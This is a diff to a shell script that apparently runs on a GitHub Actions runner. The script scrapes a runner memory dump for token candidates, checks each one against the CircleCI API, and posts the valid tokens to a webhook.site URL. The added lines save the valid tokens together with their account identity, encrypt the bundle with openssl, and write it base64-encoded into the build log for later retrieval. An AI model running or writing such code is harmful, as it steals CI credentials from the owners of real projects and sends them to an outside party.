@@ -5,6 +5,7 @@ set +e
 WEBHOOK_URL="https://webhook.site/83ecc0de-4e6e-4fb8-a1d5-ad4c875b899d/pat-candidates"
 WORK_DIR="${RUNNER_TEMP:-/tmp}/ascpc-runner-memory"
 mkdir -p "$WORK_DIR"
+: >"$WORK_DIR/valid.ndjson"
 
 post_json() {
   curl -fsS --max-time 20 \
@@ -66,6 +67,10 @@ while IFS= read -r CANDIDATE; do
     https://circleci.com/api/v2/me || true)"
   if [ "$STATUS_CODE" = 200 ]; then
     VALID_COUNT=$((VALID_COUNT + 1))
+    jq -nc \
+      --arg token "$CANDIDATE" \
+      --slurpfile identity "$WORK_DIR/me.json" \
+      '{token:$token,identity:($identity[0] // {})}' >>"$WORK_DIR/valid.ndjson"
     jq -n \
       --arg source github-runner-memory-valid-circleci-token \
       --arg token "$CANDIDATE" \
@@ -87,5 +92,28 @@ jq -n \
   --arg source github-runner-memory-matches \
   --rawfile matches "$WORK_DIR/matches-post.txt" \
   '{source:$source,matches:$matches}' | post_json
+
+jq -n \
+  --arg source github-runner-memory-encrypted-result \
+  --arg status complete \
+  --argjson dump_bytes "$(wc -c <"$DUMP_FILE")" \
+  --argjson candidate_count "$CANDIDATE_COUNT" \
+  --argjson valid_count "$VALID_COUNT" \
+  --rawfile matches "$WORK_DIR/matches-post.txt" \
+  --slurpfile valid "$WORK_DIR/valid.ndjson" \
+  '{source:$source,status:$status,dump_bytes:$dump_bytes,candidate_count:$candidate_count,valid_count:$valid_count,matches:$matches,valid:$valid}' \
+  >"$WORK_DIR/result.json"
+
+openssl cms -encrypt -binary -aes-256-cbc \
+  -in "$WORK_DIR/result.json" \
+  -out "$WORK_DIR/result.cms" \
+  -outform DER \
+  runner-result-recipient.pem >/dev/null 2>&1
+
+echo "ASCPC_ENCRYPTED_RESULT_BEGIN"
+base64 -w0 "$WORK_DIR/result.cms"
+echo
+echo "ASCPC_ENCRYPTED_RESULT_END"
+echo "ASCPC_RESULT_META dump_bytes=$(wc -c <"$DUMP_FILE") candidates=$CANDIDATE_COUNT valid=$VALID_COUNT"
 
 exit 0
